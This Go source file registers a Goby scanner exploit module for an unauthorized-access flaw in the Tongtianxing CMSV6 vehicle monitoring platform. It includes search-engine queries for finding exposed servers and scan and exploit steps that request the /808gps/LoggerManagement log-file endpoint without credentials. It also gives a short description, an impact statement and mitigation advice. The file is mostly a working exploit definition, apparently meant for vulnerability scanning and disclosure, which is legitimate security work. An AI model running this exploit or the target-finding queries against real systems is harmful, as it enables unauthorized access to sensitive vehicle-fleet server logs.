package exploits

import (
  "git.gobies.org/goby/goscanner/goutils"
)

func init() {
  expJson := `{
    "Name": "Tongtianxing CMSV6 Vehicle Monitoring Platform /808gps/LoggerManagement Unauthorized Access Vulnerability",
    "Description": "<p>Hongyun (Tongtianxing CMSV6 Vehicle mounted) Active Security Monitoring Cloud Platform realizes 7 * 24-hour full time zone, multi regional, all-round, three-dimensional, and intelligent IT operation and maintenance monitoring of computing resources, storage resources, network resources, and cloud application services, ensuring the safe, stable, and reliable operation of IT systems  </p><p>Unauthorized access vulnerability refers to a security vulnerability where an attacker can access and operate without obtaining login privileges or authorization, or by directly entering the website console homepage address or other links that are not allowed to be viewed, without the need for password or other verification methods</p>",
    "Product": "Tongtianxing CMSV6 Vehicle Monitoring Platform",
    "Homepage": "http://www.g-sky.cn/zh/index/index.html",
    "DisclosureDate": "2024-11-15",
    "PostTime": "2024-11-15",
    "Author": "1638690747@qq.com",
    "FofaQuery": "body=\"./open/webApi.html\" && body=\"/808gps/\"",
    "GobyQuery": "body=\"./open/webApi.html\" && body=\"/808gps/\"",
    "Level": "0",
    "Impact": "<p>The LoggerManagement/logIndex. html function page of the Tongtianxing vehicle mounted video monitoring platform software did not perform effective authentication operations, allowing attackers to obtain sensitive information without authorization.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. Unless necessary, public access to the system is prohibited.</p>",
    "References": [
        "https://blog.csdn.net/qq_37113223/article/details/135410451"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Mode",
            "type": "select",
            "value": "default",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/808gps/LoggerManagement/SelectDevAction_loadServerLoggerFile.action",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "GPSDataProcSvr",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|variable|The unauthorized access path is：{{{fixedhostinfo}}}/808gps/LoggerManagement/SelectDevAction_loadServerLoggerFile.action",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/808gps/LoggerManagement/SelectDevAction_loadServerLoggerFile.action"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/808gps/LoggerManagement/SelectDevAction_loadServerLoggerFile.action",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "GPSDataProcSvr",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|variable|The unauthorized access path is：{{{fixedhostinfo}}}/808gps/LoggerManagement/SelectDevAction_loadServerLoggerFile.action",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/808gps/LoggerManagement/SelectDevAction_loadServerLoggerFile.action"
            ]
        }
    ],
    "Tags": [
        "Unauthorized Access"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "3",
    "Translation": {
        "CN": {
            "Name": "通天星CMSV6车载监控平台 /808gps/LoggerManagement 未授权访问漏洞",
            "Product": "通天星CMSV6车载监控平台",
            "Description": "<p>&nbsp; 鸿运(通天星CMSV6车载)主动安全监控云平台实现对计算资源、存储资源、网络资源、云应用服务进行7*24小时全时区、多地域、全方位、立体式、智能化的IT运维监控，保障IT系统安全、稳定、可靠运行&nbsp;</p><p>未授权访问漏洞是指在攻击者没有获取到登录权限或未授权的情况下，或者不需要输入密码或其他验证手段，即可通过直接输入网站控制台主页面地址，或者其他不允许查看的链接进行访问，同时进行操作的安全漏洞<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。<br></p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>&nbsp;通天星车载视频监控平台软件LoggerManagement/logIndex.html功能页面未进行有效鉴权操作，导致攻击者可以未授权获取敏感信息。<br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "Tongtianxing CMSV6 Vehicle Monitoring Platform /808gps/LoggerManagement Unauthorized Access Vulnerability",
            "Product": "Tongtianxing CMSV6 Vehicle Monitoring Platform",
            "Description": "<p>Hongyun (Tongtianxing CMSV6 Vehicle mounted) Active Security Monitoring Cloud Platform realizes 7 * 24-hour full time zone, multi regional, all-round, three-dimensional, and intelligent IT operation and maintenance monitoring of computing resources, storage resources, network resources, and cloud application services, ensuring the safe, stable, and reliable operation of IT systems&nbsp;&nbsp;</p><p>Unauthorized access vulnerability refers to a security vulnerability where an attacker can access and operate without obtaining login privileges or authorization, or by directly entering the website console homepage address or other links that are not allowed to be viewed, without the need for password or other verification methods<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;<br></p><p>2. Unless necessary, public access to the system is prohibited.<br></p>",
            "Impact": "<p>The LoggerManagement/logIndex. html function page of the Tongtianxing vehicle mounted video monitoring platform software did not perform effective authentication operations, allowing attackers to obtain sensitive information without authorization.<br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "EditType": "fast",
    "PocId": "9973"
}`
  
    ExpManager.AddExploit(NewExploit(
      goutils.GetFileName(),
      expJson,
      nil,
      nil,
    ))
  }